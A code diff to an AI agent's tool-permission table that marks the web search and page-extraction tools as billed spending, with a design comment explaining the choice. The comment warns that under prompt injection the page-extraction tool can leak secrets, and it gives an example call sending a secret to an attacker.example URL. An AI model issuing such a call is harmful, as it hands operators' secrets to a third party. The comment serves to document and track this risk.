@@ -150,6 +150,35 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
   //
   // `web_search` / `web_extract` need a provider API key; the memory tools need
   // @ax/memory-strata. Inert where absent.
+  //
+  // The two web tools carry `effect: 'spends'` (TASK-263). They are not merely
+  // reads: @ax/web-tools implements them by making a BILLED Anthropic Messages
+  // call per invocation on the operator's key, so every use costs money. They
+  // stay `allow` — a metered read with no third-party-visible effect is the
+  // case where holding would be pure friction — but the spend is now declared
+  // in the table instead of being a fact you had to know about
+  // `@ax/web-tools`' implementation to discover.
+  //
+  // They stay `provenance: 'catalog'` deliberately. `catalog` claims "reachable
+  // and no rule GATES it", which is still exactly true; declaring an effect is
+  // a disclosure, not a gate, so promoting these to `'rule'` would overstate
+  // how much the permission itself was deliberated.
+  //
+  // WEB_EXTRACT IS ALSO AN EXFILTRATION CHANNEL, and `spends` does not say so.
+  // `url-guard.ts` refuses only localhost/.local/.internal, so any PUBLIC URL
+  // the agent names is fetched — and under prompt injection (untrusted content
+  // is the normal case on this surface, invariant 5)
+  // `web_extract('https://attacker.example/?x=<secret>')` hands data to a
+  // third party that sees the request, unrecoverably. By the definition in
+  // `ToolEffect` that is `outward`.
+  //
+  // It is filed as `spends` anyway, and that is a deliberate, narrow choice
+  // rather than a judgement that it is safe: marking it `outward` makes the
+  // lint force a hold on every page read, which is a UX decision about a live
+  // deployment and not one to smuggle in under a classification change.
+  // TASK-330 carries the decision. Flagged here, in the table, because the
+  // alternative is a rule that reads as though someone concluded it was
+  // harmless.
   {
     id: 'web.search',
     match: { tool: 'web_search' },
@@ -157,6 +186,7 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
     capability: 'search the web',
     subject: 'agent',
     provenance: 'catalog',
+    effect: 'spends',
   },
   {
     id: 'web.extract',
@@ -165,6 +195,7 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
     capability: 'read a web page you name',
     subject: 'agent',
     provenance: 'catalog',
+    effect: 'spends',
   },
   {
     id: 'memory.search',
